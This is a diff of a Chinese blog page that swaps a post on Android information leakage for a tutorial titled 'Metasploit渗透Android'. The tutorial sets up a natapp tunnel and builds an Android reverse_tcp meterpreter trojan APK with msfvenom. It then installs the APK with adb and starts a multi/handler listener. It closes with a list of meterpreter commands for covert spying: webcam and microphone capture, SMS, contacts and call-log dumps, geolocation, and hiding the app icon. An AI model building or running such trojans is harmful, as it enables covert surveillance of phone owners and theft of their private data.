@@ -11,7 +11,7 @@
 
     <title>
         
-        android 信息泄露 - tea9的博客 | tea9&#39;s Blog
+        Metasploit渗透Android - tea9的博客 | tea9&#39;s Blog
         
     </title>
 
@@ -126,7 +126,7 @@
     </div>
     
         <div id="toc" class="toc-article">
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ContentProvider目录遍历"><span class="toc-text">ContentProvider目录遍历</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地存储泄露信息"><span class="toc-text">本地存储泄露信息</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#内网穿透"><span class="toc-text">内网穿透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metesploit木马"><span class="toc-text">Metesploit木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#启动msf"><span class="toc-text">启动msf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用命令"><span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LINKS"><span class="toc-text">LINKS</span></a></li></ol>
 </div>
     
 </div>
@@ -156,18 +156,15 @@
 
 <div class="post-container">
     <div class="post-title">
-        android 信息泄露
+        Metasploit渗透Android
     </div>
 
     <div class="post-meta">
-        <span class="attr">Post：<span>2019-08-01 10:09:37</span></span>
+        <span class="attr">Post：<span>2019-08-01 14:44:14</span></span>
         
         <span class="attr">Tags：/
         
         <a class="tag" href="/tags/#android安全" title="android安全">android安全</a>
-        <span>/</span>
-        
-        <a class="tag" href="/tags/#APP漏洞" title="APP漏洞">APP漏洞</a>
         <span>/</span>
         
         
@@ -177,11 +174,14 @@
 </span>
     </div>
     <div class="post-content no-indent">
-        <h2 id="ContentProvider目录遍历"><a href="#ContentProvider目录遍历" class="headerlink" title="ContentProvider目录遍历"></a>ContentProvider目录遍历</h2><blockquote>
-<p>该漏洞由于Content Provider组件暴露，没有对Content Provider组件访问权限进行限制且对Uri路径没有进行过滤，攻击者通过Content Provider实现的OpenFile接口进行攻击，如通过”../”的方式访问任意的目录文件，造成隐私泄露。  </p>
-</blockquote>
-<p><a href="http://01hackcode.com/wiki/7.3" target="_blank" rel="noopener">7.3 ContentProvider目录遍历漏洞检测</a>  </p>
-<h2 id="本地存储泄露信息"><a href="#本地存储泄露信息" class="headerlink" title="本地存储泄露信息"></a>本地存储泄露信息</h2>
+        <h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>进入<a href="https://natapp.cn/" target="_blank" rel="noopener">https://natapp.cn/</a><br>注册并创建tcp隧道<br>复制authtoken<br>下载客户端  </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">解压缩</span><br><span class="line">chmod a+x natapp</span><br><span class="line">./natapp</span><br><span class="line"></span><br><span class="line">natapp <span class="attribute">-authtoken</span>=9ab6b9040a624f40</span><br><span class="line"></span><br><span class="line">ping server.natappfree.cc 得到服务器ip和端口号</span><br></pre></td></tr></table></figure>
+<h2 id="Metesploit木马"><a href="#Metesploit木马" class="headerlink" title="Metesploit木马"></a>Metesploit木马</h2><p>mac查看本机ip-设置-网络<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=本机ip <span class="attribute">LPORT</span>=natapp端口号 R &gt;test1.apk</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb <span class="keyword">install</span> test1.apk</span><br></pre></td></tr></table></figure>
+<h2 id="启动msf"><a href="#启动msf" class="headerlink" title="启动msf"></a>启动msf</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"> use exploit/multi/handler 加载模块</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"> <span class="built_in">set</span> payload android/meterpreter/reverse_tcp	选择Payload</span></span><br><span class="line"></span><br><span class="line">修改Ip和端口</span><br><span class="line"></span><br><span class="line">Ip设置为natapp中配置的本机ip</span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"> <span class="built_in">set</span> LHOST 本机ip		</span></span><br><span class="line"></span><br><span class="line">端口设置为natapp中配置的本地端口	</span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"> <span class="built_in">set</span> LPORT 端口号			</span></span><br><span class="line"></span><br><span class="line">开始监听，等待木马相应</span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"> exploit</span></span><br></pre></td></tr></table></figure>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Stdapi: Webcam Commands</span><br><span class="line">===================================</span><br><span class="line"><span class="code">	webcam_list  列出网络摄像头</span></span><br><span class="line"><span class="code">	record_mic [ˈrekərd]/记录/  从默认麦克风录制音频为X秒</span></span><br><span class="line"><span class="code">	webcam_chat  开始视频聊天</span></span><br><span class="line"><span class="code">	webcam_snap  从指定的摄像头获取快照</span></span><br><span class="line"><span class="code">	webcam_stream -i 1  从指定的网络摄像头播放视频流[选择后摄像头]</span></span><br><span class="line"></span><br><span class="line">Android Commands</span><br><span class="line">=================</span><br><span class="line"><span class="code">	activity_start  从URI字符串启动Android活动</span></span><br><span class="line"><span class="code">	check_root  检查设备是否有根</span></span><br><span class="line"><span class="code">	dump_calllog  获取调用日志</span></span><br><span class="line"><span class="code">	dump_contacts  获取联系人列表</span></span><br><span class="line"><span class="code">	dump_sms  获取短信</span></span><br><span class="line"><span class="code">	geolocate  利用地理定位获取当前LAT</span></span><br><span class="line"><span class="code">	wlan_geolocate  利用WLAN信息获取当前LAT</span></span><br><span class="line"><span class="code">	hide_app_icon  从发射器隐藏应用程序图标</span></span><br><span class="line"><span class="code">	interval_collect  管理区间收集能力</span></span><br><span class="line"><span class="code">	send_sms  从目标会话发送短消息</span></span><br><span class="line"><span class="code">	set_audio_mode </span></span><br><span class="line"><span class="code">	sqlite_query  从存储库查询SQLite数据库</span></span><br><span class="line"><span class="code">	wakelock  启用/禁用Wakelock</span></span><br></pre></td></tr></table></figure>
+<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://natapp.cn" target="_blank" rel="noopener">natapp</a><br><a href="https://blog.csdn.net/Aaron_Miller/article/details/80375807" target="_blank" rel="noopener">Metasploit之渗透Android手机</a><br><a href="https://www.cnblogs.com/Te7m/p/5938445.html" target="_blank" rel="noopener">使用Metasploit实现对Android的远程管理</a><br><a href="https://www.freebuf.com/articles/network/138688.html" target="_blank" rel="noopener">如何手动将Metasploit的Payloads注入到Android应用中</a>  </p>
+
         
         <br />
         <div id="comment-container">
